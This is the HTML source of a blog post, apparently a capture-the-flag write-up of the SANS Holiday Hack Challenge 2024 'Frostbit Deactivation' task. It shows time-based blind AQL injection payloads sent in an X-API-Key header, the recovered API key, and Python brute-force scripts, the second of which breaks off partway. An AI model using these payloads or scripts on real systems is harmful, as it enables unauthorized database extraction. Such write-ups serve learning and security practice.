@@ -1,0 +1,752 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  HHC24 - Frostbit Deactivation · Journey into IT Knowledge
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="ArmBraker 👨‍💻">
+<meta name="description" content="Ransomware bot deactivation by hacking of python endpoint abusing AQL blind injection">
+<meta name="keywords" content="blog,knowledge,IT Security,hacking,personal,networking">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HHC24 - Frostbit Deactivation">
+  <meta name="twitter:description" content="Ransomware bot deactivation by hacking of python endpoint abusing AQL blind injection">
+
+<meta property="og:url" content="https://armbraker.github.io/blog/posts/hhc24/frostbitdeactivation/">
+  <meta property="og:site_name" content="Journey into IT Knowledge">
+  <meta property="og:title" content="HHC24 - Frostbit Deactivation">
+  <meta property="og:description" content="Ransomware bot deactivation by hacking of python endpoint abusing AQL blind injection">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-01-26T14:59:34+01:00">
+    <meta property="article:modified_time" content="2025-01-26T14:59:34+01:00">
+    <meta property="article:tag" content="HHC24">
+    <meta property="article:tag" content="Sans">
+    <meta property="article:tag" content="CTF">
+      <meta property="og:see_also" content="https://armbraker.github.io/blog/posts/hhc24/elfstack/">
+      <meta property="og:see_also" content="https://armbraker.github.io/blog/posts/hhc24/santavision/">
+      <meta property="og:see_also" content="https://armbraker.github.io/blog/posts/hhc24/dronmagedon/">
+      <meta property="og:see_also" content="https://armbraker.github.io/blog/posts/hhc24/powershell/">
+      <meta property="og:see_also" content="https://armbraker.github.io/blog/posts/hhc24/snowball-showdown/">
+      <meta property="og:see_also" content="https://armbraker.github.io/blog/posts/hhc24/hardwarehacking_101/">
+
+
+
+
+<link rel="canonical" href="https://armbraker.github.io/blog/posts/hhc24/frostbitdeactivation/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/blog/css/coder.min.f04d4c2b3aa2d369dd0f02bc87d53b60d811a0f74526c9ef8a434ee3248b3606.css" integrity="sha256-8E1MKzqi02ndDwK8h9U7YNgRoPdFJsnvikNO4ySLNgY=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/blog/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="https://armbraker.github.io/blog/">
+      Journey into IT Knowledge
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/blog/">Home</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/blog/posts/">Blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/blog/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://armbraker.github.io/blog/posts/hhc24/frostbitdeactivation/">
+              HHC24 - Frostbit Deactivation
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2025-01-26T14:59:34&#43;01:00">
+                January 26, 2025
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              8-minute read
+            </span>
+          </div>
+          
+          <div class="categories">
+  <i class="fa-solid fa-folder" aria-hidden="true"></i>
+    <a href="/blog/categories/writeup/">Writeup</a>
+      <span class="separator">•</span>
+    <a href="/blog/categories/web-app-hacking/">Web-App Hacking</a>
+      <span class="separator">•</span>
+    <a href="/blog/categories/python/">Python</a>
+      <span class="separator">•</span>
+    <a href="/blog/categories/blind-injection/">Blind Injection</a>
+      <span class="separator">•</span>
+    <a href="/blog/categories/aql-database/">AQL Database</a></div>
+
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/blog/tags/hhc24/">HHC24</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/blog/tags/sans/">Sans</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/blog/tags/ctf/">CTF</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <h2 id="introduction">
+  Introduction
+  <a class="heading-link" href="#introduction">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<blockquote>
+<p><strong>This was the final challenge of HHC24.</strong></p>
+</blockquote>
+<ul>
+<li>For this challenge we need to put all given things together to solve this challenge. From previous session we know the next application endpoint where we must deactivate the Frostbit malware:</li>
+</ul>
+<p><a href="https://api.frostbit.app/api/v1/frostbitadmin/bot/83270120-3b1c-41f3-b25b-deaa5b5d1327/deactivate"  class="external-link" target="_blank" rel="noopener">https://api.frostbit.app/api/v1/frostbitadmin/bot/83270120-3b1c-41f3-b25b-deaa5b5d1327/deactivate</a></p>
+<ul>
+<li>
+<p>We got a hint from one of the elves that to be able to disable the Frostbit we need to execute <strong>BLIND</strong> injection.</p>
+</li>
+<li>
+<p>The exploitable HEADER should be <strong>X-API-Key</strong> as was mentioned in previous <code>MQTT</code> broadcasts.</p>
+</li>
+</ul>
+<h2 id="gold-">
+  Gold 🥇
+  <a class="heading-link" href="#gold-">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Oh, to mention there is <strong>no silver</strong> 🥈 if you already solved the Decryption challenge!</p>
+<ul>
+<li>Let&rsquo;s activate the debug as we used it in previous challenge with simple adding <code>?debug=true</code> as parameter:
+<a href="https://api.frostbit.app/api/v1/frostbitadmin/bot/83270120-3b1c-41f3-b25b-deaa5b5d1327/deactivate?debug=true"  class="external-link" target="_blank" rel="noopener">https://api.frostbit.app/api/v1/frostbitadmin/bot/83270120-3b1c-41f3-b25b-deaa5b5d1327/deactivate?debug=true</a></li>
+</ul>
+<h2 id="aql-discovery">
+  AQL discovery
+  <a class="heading-link" href="#aql-discovery">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li>By sending of <code>1'</code> as value in vulnerable <strong>HEADER X-API-Key</strong>, I got following error:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#5af78e">&#34;Timeout or error in query:\nFOR doc IN config\n FILTER doc.&lt;key_name_omitted&gt; == &#39;{user_supplied_x_api_key}&#39;\n &lt;other_query_lines_omitted&gt;\n RETURN doc&#34;</span>
+</span></span></code></pre></div><ul>
+<li>I used the copilot to identify the DB vendor according to this error and it said it can be AragonDB:</li>
+</ul>
+<p><code>The structure of the query and the terminology used, such as &quot;FOR doc IN config&quot; and &quot;FILTER,&quot; points towards it being associated with ArangoDB. ArangoDB is a multi-model NoSQL database that supports key/value, document, and graph data models.</code></p>
+<h2 id="testing-for-blind-injection">
+  Testing for BLIND Injection
+  <a class="heading-link" href="#testing-for-blind-injection">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li>I found the SYNTAX which may trigger the sleep function:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#5af78e">&#39; or SLEEP(2) --&#39;</span>a
+</span></span></code></pre></div><ul>
+<li>According to error message I need to find the name of the KEY <code>doc.&lt;key_name_omitted&gt;</code> for later pulling its value.</li>
+</ul>
+<h2 id="keys-name-dump">
+  Key&rsquo;s name dump
+  <a class="heading-link" href="#keys-name-dump">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<h3 id="how-many-attributes">
+  how many attributes
+  <a class="heading-link" href="#how-many-attributes">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>First we need to determine how many attributes the <code>doc</code> has:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#5af78e">&#39; or LENGTH(ATTRIBUTES(doc))==4 ? SLEEP(2) : &#39;</span>a
+</span></span></code></pre></div><ul>
+<li>Answer is <code>4</code>.</li>
+</ul>
+<h3 id="length-of-attribute-name">
+  Length of attribute name
+  <a class="heading-link" href="#length-of-attribute-name">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>We need to enumerate how many characters each attribute has:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#5af78e">&#39;or LENGTH(ATTRIBUTES(doc)[{attribute_index}])=={length} ? SLEEP(2) : &#39;</span>a
+</span></span></code></pre></div><ul>
+<li>Answer is:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Attribute 0 has length of 18
+</span></span><span style="display:flex;"><span>Attribute 1 has length of 4
+</span></span><span style="display:flex;"><span>Attribute 2 has length of 4
+</span></span><span style="display:flex;"><span>Attribute 3 has length of 3
+</span></span></code></pre></div><h3 id="guess-name-of-the-attribute">
+  Guess name of the attribute
+  <a class="heading-link" href="#guess-name-of-the-attribute">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>Now we are ready to execute the bruteforce attack to find a name of each attribute.</li>
+<li>We need to make a AQL query using of one STRING methods, e.g. LIKE <a href="https://docs.arangodb.com/3.12/aql/functions/string/#like"  class="external-link" target="_blank" rel="noopener">https://docs.arangodb.com/3.12/aql/functions/string/#like</a></li>
+<li>The AQL utilizing the LIKE method can looks like:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#5af78e">&#39; OR ATTRIBUTES(doc)[0] LIKE &#39;</span><span style="color:#ff5c57">{</span>pattern<span style="color:#ff5c57">}</span><span style="color:#5af78e">&#39; ? SLEEP(2) : &#39;</span>a
+</span></span></code></pre></div><ul>
+<li>Guessed name for Attribute 0: <code>deactivate_api_key</code></li>
+</ul>
+<h3 id="length-of-value-of-attribute-deactivate_api_key">
+  Length of value of attribute <em><strong>deactivate_api_key</strong></em>
+  <a class="heading-link" href="#length-of-value-of-attribute-deactivate_api_key">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>So far, we know the name of the attribute we can start guessing its length.</li>
+<li>Possible AQL:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span> <span style="color:#5af78e">&#39; or LENGTH(doc.deactivate_api_key})==36 ? SLEEP(2) : &#39;</span>a<span style="color:#5af78e">&#34;
+</span></span></span></code></pre></div><ul>
+<li>Answer: Length of &lsquo;deactivate_api_key&rsquo; value: <code>36</code></li>
+</ul>
+<h3 id="guess-value-of-the-attribute">
+  Guess value of the attribute
+  <a class="heading-link" href="#guess-value-of-the-attribute">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>No we have all parameters to start guessing the value of the attribute <em><strong>deactivate_api_key</strong></em></li>
+<li>From previous iteration and know values we can craft a AQLi payload like:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#5af78e">&#39; OR doc.deactivate_api_key LIKE &#39;</span><span style="color:#ff5c57">{</span>pattern<span style="color:#ff5c57">}</span><span style="color:#5af78e">&#39; ? SLEEP(2) : &#39;</span>a
+</span></span></code></pre></div><ul>
+<li>Sometimes the server is acting strange, I need to wait for next day to start with the attempt for guessing the value.</li>
+<li>Okay! Problem was on my VM, from HOST machine it finished without any problem and value is:</li>
+</ul>
+<p><em>Guessed value for &lsquo;deactivate_api_key&rsquo;:</em> <code>abe7a6ad-715e-4e6a-901b-c9279a964f91</code></p>
+<h2 id="finish-him-">
+  Finish him! 🥇
+  <a class="heading-link" href="#finish-him-">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li>Now we know everything we need to deactivate the API!</li>
+<li>Lets send GET request to <a href="https://api.frostbit.app/api/v1/frostbitadmin/bot/83270120-3b1c-41f3-b25b-deaa5b5d1327/deactivate?debug=true"  class="external-link" target="_blank" rel="noopener">https://api.frostbit.app/api/v1/frostbitadmin/bot/83270120-3b1c-41f3-b25b-deaa5b5d1327/deactivate?debug=true</a> with HEADER <em><strong>X-API-Key:abe7a6ad-715e-4e6a-901b-c9279a964f91</strong></em></li>
+<li>Response:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#ff6ac1">&#34;message&#34;</span>: <span style="color:#5af78e">&#34;Response status code: 200, Response body: {\&#34;result\&#34;:\&#34;success\&#34;,\&#34;rid\&#34;:\&#34;83270120-3b1c-41f3-b25b-deaa5b5d1327\&#34;,\&#34;hash\&#34;:\&#34;3c7b7e6287a6e797196c970017ed9ecbe2c2d7ebafce6a605b1b35e16bab431d\&#34;,\&#34;uid\&#34;:\&#34;46597\&#34;}\nPOSTED WIN RESULTS FOR RID 83270120-3b1c-41f3-b25b-deaa5b5d1327&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ff6ac1">&#34;status&#34;</span>: <span style="color:#5af78e">&#34;Deactivated&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li>GLORY!!! 🥇</li>
+<li>My profile an achievements are visible at: <a href="https://account.counterhack.com/user/ArmBraker"  class="external-link" target="_blank" rel="noopener">https://account.counterhack.com/user/ArmBraker</a></li>
+</ul>
+<hr>
+<h2 id="python-scripts">
+  Python Scripts
+  <a class="heading-link" href="#python-scripts">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li><em><strong>Disclaimer:</strong></em> belows scripts are very similar, just AQL injections are different, so it can be consolidated in one script, but how learning purposes I divided them.</li>
+</ul>
+<h3 id="guessing-length-of-attributes-in-aql-database">
+  Guessing length of attributes in AQL Database
+  <a class="heading-link" href="#guessing-length-of-attributes-in-aql-database">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Define the target URL and headers</span>
+</span></span><span style="display:flex;"><span>url <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#39;https://api.frostbit.app/api/v1/frostbitadmin/bot/83270120-3b1c-41f3-b25b-deaa5b5d1327/deactivate?debug=true&#39;</span>
+</span></span><span style="display:flex;"><span>headers <span style="color:#ff6ac1">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#5af78e">&#39;Host&#39;</span>: <span style="color:#5af78e">&#39;api.frostbit.app&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#5af78e">&#39;X-Api-Key&#39;</span>: <span style="color:#5af78e">&#34;&#34;</span>  <span style="color:#78787e"># Placeholder for length</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Function to test different lengths for each attribute</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">test_attribute_length</span>(attribute_index):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;Testing length for attribute </span><span style="color:#5af78e">{</span>attribute_index<span style="color:#5af78e">}</span><span style="color:#5af78e">...&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#78787e"># Brute force from length 1 to 40 (you can adjust this range as needed)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">for</span> length <span style="color:#ff6ac1">in</span> <span style="color:#ff5c57">range</span>(<span style="color:#ff9f43">1</span>, <span style="color:#ff9f43">40</span>):
+</span></span><span style="display:flex;"><span>        payload <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;&#39; or LENGTH(ATTRIBUTES(doc)[</span><span style="color:#5af78e">{</span>attribute_index<span style="color:#5af78e">}</span><span style="color:#5af78e">])==</span><span style="color:#5af78e">{</span>length<span style="color:#5af78e">}</span><span style="color:#5af78e"> ? SLEEP(2) : &#39;a&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#78787e">#print(payload)</span>
+</span></span><span style="display:flex;"><span>        headers[<span style="color:#5af78e">&#39;X-Api-Key&#39;</span>] <span style="color:#ff6ac1">=</span> payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        start_time <span style="color:#ff6ac1">=</span> time<span style="color:#ff6ac1">.</span>time()  <span style="color:#78787e"># Record the start time of the request</span>
+</span></span><span style="display:flex;"><span>        response <span style="color:#ff6ac1">=</span> requests<span style="color:#ff6ac1">.</span>get(url, headers<span style="color:#ff6ac1">=</span>headers)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        elapsed_time <span style="color:#ff6ac1">=</span> time<span style="color:#ff6ac1">.</span>time() <span style="color:#ff6ac1">-</span> start_time  <span style="color:#78787e"># Calculate the response time</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">if</span> elapsed_time <span style="color:#ff6ac1">&gt;=</span> <span style="color:#ff9f43">2</span>:  <span style="color:#78787e"># If the response is delayed by 2 seconds, it means we&#39;ve found the correct length</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;Attribute </span><span style="color:#5af78e">{</span>attribute_index<span style="color:#5af78e">}</span><span style="color:#5af78e"> has length: </span><span style="color:#5af78e">{</span>length<span style="color:#5af78e">}</span><span style="color:#5af78e">&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">return</span> length
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        time<span style="color:#ff6ac1">.</span>sleep(<span style="color:#ff9f43">0.5</span>)  <span style="color:#78787e"># Small delay between requests to avoid overloading the server</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;Could not determine the length for attribute </span><span style="color:#5af78e">{</span>attribute_index<span style="color:#5af78e">}</span><span style="color:#5af78e"> in the range 1-20.&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Function to determine the lengths of all attributes (we know there are 4 attributes)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">determine_attribute_lengths</span>():
+</span></span><span style="display:flex;"><span>    attribute_lengths <span style="color:#ff6ac1">=</span> []
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">for</span> i <span style="color:#ff6ac1">in</span> <span style="color:#ff5c57">range</span>(<span style="color:#ff9f43">4</span>):  <span style="color:#78787e"># Loop through the 4 attributes</span>
+</span></span><span style="display:flex;"><span>        length <span style="color:#ff6ac1">=</span> test_attribute_length(i)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">if</span> length <span style="color:#ff6ac1">is</span> <span style="color:#ff6ac1">not</span> <span style="color:#ff6ac1">None</span>:
+</span></span><span style="display:flex;"><span>            attribute_lengths<span style="color:#ff6ac1">.</span>append(length)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> attribute_lengths
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Main function to run the script</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span> __name__ <span style="color:#ff6ac1">==</span> <span style="color:#5af78e">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">&#34;Starting brute-force for attribute lengths...</span><span style="color:#5af78e">\n</span><span style="color:#5af78e">&#34;</span>)
+</span></span><span style="display:flex;"><span>    attribute_lengths <span style="color:#ff6ac1">=</span> determine_attribute_lengths()
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span> attribute_lengths:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">&#34;</span><span style="color:#5af78e">\n</span><span style="color:#5af78e">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">for</span> index, length <span style="color:#ff6ac1">in</span> <span style="color:#ff5c57">enumerate</span>(attribute_lengths):
+</span></span><span style="display:flex;"><span>            <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;Attribute </span><span style="color:#5af78e">{</span>index<span style="color:#5af78e">}</span><span style="color:#5af78e"> has length of </span><span style="color:#5af78e">{</span>length<span style="color:#5af78e">}</span><span style="color:#5af78e">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">&#34;</span><span style="color:#5af78e">\n</span><span style="color:#5af78e">Failed to determine attribute lengths.&#34;</span>)
+</span></span></code></pre></div><h3 id="guessing-name-of-aqls-attributes">
+  Guessing name of AQL&rsquo;s attributes
+  <a class="heading-link" href="#guessing-name-of-aqls-attributes">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> string
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Define the target URL and headers</span>
+</span></span><span style="display:flex;"><span>url <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#39;https://api.frostbit.app/api/v1/frostbitadmin/bot/83270120-3b1c-41f3-b25b-deaa5b5d1327/deactivate?debug=true&#39;</span>
+</span></span><span style="display:flex;"><span>headers <span style="color:#ff6ac1">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#5af78e">&#39;Host&#39;</span>: <span style="color:#5af78e">&#39;api.frostbit.app&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#5af78e">&#39;X-Api-Key&#39;</span>: <span style="color:#5af78e">&#34;&#34;</span>  <span style="color:#78787e"># Placeholder for the payload</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Function to test a single character of the attribute name</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">test_character</span>(guessed_name, character):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#78787e"># Build the payload with the current guessed_name and the new character</span>
+</span></span><span style="display:flex;"><span>    pattern <span style="color:#ff6ac1">=</span> guessed_name <span style="color:#ff6ac1">+</span> character <span style="color:#ff6ac1">+</span> <span style="color:#5af78e">&#34;%&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;Testing pattern: &#39;</span><span style="color:#5af78e">{</span>pattern<span style="color:#5af78e">}</span><span style="color:#5af78e">&#39;&#34;</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;&#39; OR ATTRIBUTES(doc)[0] LIKE &#39;</span><span style="color:#5af78e">{</span>pattern<span style="color:#5af78e">}</span><span style="color:#5af78e">&#39; ? SLEEP(2) : &#39;a&#34;</span>
+</span></span><span style="display:flex;"><span>    headers[<span style="color:#5af78e">&#39;X-Api-Key&#39;</span>] <span style="color:#ff6ac1">=</span> payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    start_time <span style="color:#ff6ac1">=</span> time<span style="color:#ff6ac1">.</span>time()  <span style="color:#78787e"># Record the start time of the request</span>
+</span></span><span style="display:flex;"><span>    response <span style="color:#ff6ac1">=</span> requests<span style="color:#ff6ac1">.</span>get(url, headers<span style="color:#ff6ac1">=</span>headers)
+</span></span><span style="display:flex;"><span>    elapsed_time <span style="color:#ff6ac1">=</span> time<span style="color:#ff6ac1">.</span>time() <span style="color:#ff6ac1">-</span> start_time  <span style="color:#78787e"># Calculate response time</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span> elapsed_time <span style="color:#ff6ac1">&gt;=</span> <span style="color:#ff9f43">2</span>:  <span style="color:#78787e"># If response is delayed by 2 seconds, the character is correct</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;Found character &#39;</span><span style="color:#5af78e">{</span>character<span style="color:#5af78e">}</span><span style="color:#5af78e">&#39;!&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">True</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">False</span>
+</span></span><span style="display:flex;"><span>
